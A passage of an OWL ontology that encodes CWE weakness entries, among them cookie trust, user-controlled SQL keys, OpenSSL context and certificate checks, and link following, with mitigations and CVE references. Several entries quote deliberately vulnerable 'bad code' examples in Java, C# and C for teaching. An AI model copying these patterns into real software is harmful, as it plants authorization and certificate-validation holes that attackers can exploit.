     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Protect log files against unauthorized read/write."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-538_File_and_Directory_Information_Exposure

    Annotations: 
        rdfs:comment "Maintenance:
Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness."^^xsd:string,
        rdfs:comment "Maintenance:
There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category."^^xsd:string,
        rdfs:comment "The product stores sensitive information in files or directories that are accessible to actors outside of the intended control sphere."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "WSDL Scanning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-95,
     ID  "538"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not expose file and directory information to the user."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not expose file and directory information to the user."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Do not expose file and directory information to the user."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-544_Missing_Standardized_Error_Handling_Mechanism

    Annotations: 
        rdfs:comment "If the application handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. The causes of errors may be lost. Also, detailed information about the causes of an error may be unintentionally returned to the user."^^xsd:string,
        rdfs:comment "The software does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     ID  "544"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "define a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     integrity  "Quality Degradation"^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     integrity  "Varies by Context"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Quality Degradation"^^xsd:string,
     other  "Unexpected State"^^xsd:string,
     other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-550_Information_Exposure_Through_Server_Error_Message

    Annotations: 
        rdfs:comment "Certain conditions, such as network failure, will cause a server error message to be displayed."^^xsd:string,
        rdfs:comment "While error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1016_Limit_Exposure,
     ID  "550"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Recommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-551_Incorrect_Behavior_Order

    Annotations: 
        rdfs:comment "For instance, the character strings /./ and / both mean current directory. If /SomeDirectory is a protected directory and an attacker requests /./SomeDirectory, the attacker may be able to gain access to the resource if /./ is not converted to / before the authorization check is performed."^^xsd:string,
        rdfs:comment "If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection."^^xsd:string,
        rdfs:comment "Incorrect Behavior Order: Authorization Before Parsing and Canonicalization"^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "551"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-552_Files_or_Directories_Accessible_to_External_Parties

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Files or directories are accessible in the environment that should not be."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-552_Files_or_Directories_Accessible_to_External_Parties,
     
     Annotations: rdfs:comment "Probe System Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-639,
     ID  "552"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Modify Files or Directories"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Files or Directories"^^xsd:string,
     integrity  "Read Files or Directories"^^xsd:string,
     modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-565_Reliance_on_Cookies_without_Validation_and_Integrity_Checking

    Annotations: 
        rdfs:comment "Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways."^^xsd:string,
        rdfs:comment "Relationship:
This problem can be primary to many types of weaknesses in web applications. A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks.."^^xsd:string,
        rdfs:comment "The application relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     related_attack_patterns  CAPEC-226,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     ID  "565"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to escalate an attacker's privileges to an administrative level."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "Add integrity checks to detect tampering."^^xsd:string, 
                 rdfs:comment "Avoid using cookie data for a security-related decision."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code excerpt reads a value from a browser cookie to determine the role of the user.

(bad code)
Example Language: Java 
Cookie[] cookies = request.getCookies();
for (int i =0; i< cookies.length; i++) {
Cookie c = cookies[i];
if (c.getName().equals(\"role\")) {
userRole = c.getValue();
}
}
It is easy for an attacker to modify the \"role\" value found in the locally stored cookie, allowing privilege escalation."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-566_Authorization_Bypass_Through_User-Controlled_SQL_Primary_Key

    Annotations: 
        rdfs:comment "The software uses a database table that includes records that should not be accessible to an actor, but it executes a SQL statement with a primary key that can be controlled by that actor."^^xsd:string,
        rdfs:comment "When a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.

Database access control errors occur when:
- Data enters a program from an untrusted source.
- The data is used to specify the value of a primary key in a SQL query.
- The untrusted source does not have the permissions to be able to access all rows in the associated table."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "566"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Modify Application Data"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user.

Example Language: C#  /* (bad code) */
...
conn = new SqlConnection(_ConnectionString);
conn.Open();
int16 id = System.Convert.ToInt16(invoiceID.Text);
SqlCommand query = new SqlCommand( \"SELECT * FROM invoices WHERE id = @id\", conn);
query.Parameters.AddWithValue(\"@id\", id);
SqlDataReader objReader = objCommand.ExecuteReader();
...
The problem is that the developer has not considered all of the possible values of id. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Assume all input is malicious. Use a standard input validation mechanism to validate all input for length, type, syntax, and business rules before accepting the data. Use an \"accept known good\" validation strategy."^^xsd:string, 
                 rdfs:comment "Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Bypass Protection Mechanism"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 technologies  "Database Server"^^xsd:string
    
    
Individual: CWE-593_Authentication_Bypass_OpenSSL_CTX_Object_Modified_after_SSL_Objects_are_Created

    Annotations: 
        rdfs:comment "If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change."^^xsd:string,
        rdfs:comment "The software modifies the SSL context after connection creation has begun."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     related_attack_patterns  CAPEC-94,
     ID  "593"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "No authentication takes place in this process, bypassing an assumed protection of encryption."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "Use a language or a library that provides a cryptography framework at a higher level of abstraction."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The encrypted communication between a user and a trusted host may be subject to a \"man in the middle\" sniffing attack."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following example demonstrates the weakness.

Example Language: C   /* (bad code) */
#define CERT \"secret.pem\"
#define CERT2 \"secret2.pem\"

int main(){
SSL_CTX *ctx;
SSL *ssl;
init_OpenSSL();
seed_prng();

ctx = SSL_CTX_new(SSLv23_method());

if (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1)
int_error(\"Error loading certificate from file\");

if (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1)
int_error(\"Error loading private key from file\");

if (!(ssl = SSL_new(ctx)))
int_error(\"Error creating an SSL context\");

if ( SSL_CTX_set_default_passwd_cb(ctx, \"new default password\" != 1))
int_error(\"Doing something which is dangerous to do anyways\");

if (!(ssl2 = SSL_new(ctx)))
int_error(\"Error creating an SSL context\");
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Applications should set up an SSL_CTX completely, before creating SSL objects from it."^^xsd:string, 
                 rdfs:comment "Most SSL_CTX functions have SSL counterparts that act on SSL-type objects."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-599_Missing_Validation_of_OpenSSL_Certificate

    Annotations: 
        rdfs:comment "Relationship:
CWE-295 and CWE-599 are very similar, although CWE-599 has a more narrow scope that is only applied to OpenSSL certificates. As a result, other children of CWE-295 can be regarded as children of CWE-599 as well. CWE's use of one-dimensional hierarchical relationships is not well-suited to handle different kinds of abstraction relationships based on concepts like types of resources (\"OpenSSL certificate\" as a child of \"any certificate\") and types of behaviors (\"not validating expiration\" as a child of \"improper validation\")."^^xsd:string,
        rdfs:comment "The software uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements."^^xsd:string,
        rdfs:comment "This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     ID  "599"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Trust afforded to the system in question may allow for spoofing or redirection attacks."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "If the certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data under the guise of a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid, and that it pertains to the site we wish to access."^^xsd:string, 
                 rdfs:comment "Trust afforded to the system in question may allow for spoofing or redirection attacks."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that proper authentication is included in the system design."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The data read may not be properly secured, it might be viewed by an attacker."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following OpenSSL code ensures that the host has a certificate.

(bad code)
Example Language: C 
if (cert = SSL_get_peer_certificate(ssl)) {

// got certificate, host can be trusted 

//foo=SSL_get_verify_result(ssl); 

//if (X509_V_OK==foo) ... 
}
Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-59_Improper_Link_Resolution_Before_File_Access

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Background Details:
Soft links are a UNIX term that is synonymous with simple shortcuts on windows based platforms."^^xsd:string,
        rdfs:comment "Functional Areas:
File Processing"^^xsd:string,
        rdfs:comment "Relationship:
Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations.

Some potential factors are race conditions, permissions, and predictability."^^xsd:string,
        rdfs:comment "Research Gap:
UNIX hard links, and Windows hard/soft links are under-studied and under-reported."^^xsd:string,
        rdfs:comment "The software attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."^^xsd:string,
        rdfs:comment "insecure temporary file:	
Some people use the phrase \"insecure temporary file\" when referring to a link following weakness, but other weaknesses can produce insecure temporary files without any symlink involvement at all."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system."^^xsd:string
                 
                 references  CVE-1999-0783,
     
     Annotations: rdfs:comment "Some versions of Perl follows symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack."^^xsd:string
                 
                 references  CVE-1999-1386,
     
     Annotations: rdfs:comment "Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka \"Stealth Attachment.\""^^xsd:string
                 
                 references  CVE-2000-0342,
     
     Annotations: rdfs:comment "Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails."^^xsd:string
                 
                 references  CVE-2000-0972,
     
     Annotations: rdfs:comment "Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users."^^xsd:string
                 
                 references  CVE-2000-1178,
     
     Annotations: rdfs:comment "FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file."^^xsd:string
                 
                 references  CVE-2001-1042,
     
     Annotations: rdfs:comment "FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file."^^xsd:string
                 
                 references  CVE-2001-1043,
     
     Annotations: rdfs:comment "\".LNK.\" - .LNK with trailing dot"^^xsd:string
                 
                 references  CVE-2001-1386,
     
     Annotations: rdfs:comment "Hard link attack, file overwrite; interesting because program checks against soft links"^^xsd:string
                 
                 references  CVE-2001-1494,
     
     Annotations: rdfs:comment "File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file."^^xsd:string
                 
                 references  CVE-2002-0725,
     
     Annotations: rdfs:comment "Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files."^^xsd:string
                 
                 references  CVE-2002-0793,
     
     Annotations: rdfs:comment "Symlink attack allows local users to overwrite files."^^xsd:string
                 
                 references  CVE-2003-0517,
     
     Annotations: rdfs:comment "Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files."^^xsd:string
                 
                 references  CVE-2003-0578,
     
     Annotations: rdfs:comment "Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames."^^xsd:string
                 
                 references  CVE-2003-0844,
     
     Annotations: rdfs:comment "Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link"^^xsd:string
                 
                 references  CVE-2003-1233,
     
     Annotations: rdfs:comment "Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile."^^xsd:string
                 
                 references  CVE-2004-0217,
     
     Annotations: rdfs:comment "Window manager does not properly handle when certain symbolic links point to \"stale\" locations, which could allow local users to create or truncate arbitrary files."^^xsd:string
                 
                 references  CVE-2004-0689,
     
     Annotations: rdfs:comment "Web hosting manager follows hard links, which allows local users to read or modify arbitrary files."^^xsd:string
                 
                 references  CVE-2004-1603,
     
     Annotations: rdfs:comment "Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles."^^xsd:string
                 
                 references  CVE-2004-1901,
     
     Annotations: rdfs:comment "Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file."^^xsd:string
                 
                 references  CVE-2005-0587,
     
     Annotations: rdfs:comment "Signal causes a dump that follows symlinks."^^xsd:string
                 
                 references  CVE-2005-0824,
     
     Annotations: rdfs:comment "Hard link race condition"^^xsd:string
                 
                 references  CVE-2005-1111,
     
     Annotations: rdfs:comment "Second-order symlink vulnerabilities"^^xsd:string
                 
                 references  CVE-2005-1879,
     
     Annotations: rdfs:comment "Second-order symlink vulnerabilities"^^xsd:string
                 
                 references  CVE-2005-1880,
     
     Annotations: rdfs:comment "Symlink in Python program"^^xsd:string
                 
                 references  CVE-2005-1916,
     
     Annotations: rdfs:comment "Symlink Attack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-132,
     
     Annotations: rdfs:comment "Using Malicious Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-17,
     
     Annotations: rdfs:comment "Leverage Executable Code in Non-Executable Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-35,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     ID  "59"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Modify Files or Directories"^^xsd:string,
     access_control  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Separation of Privilege

Follow the principle of least privilege when assigning access rights to entities in a software system.
Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker may be able to traverse the file system to unintended locations and read or overwrite the contents of unexpected files. If the files are used for a security mechanism then an attacker may be able to bypass the mechanism."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Bypass Protection Mechanism"^^xsd:string,
     confidentiality  "Modify Files or Directories"^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
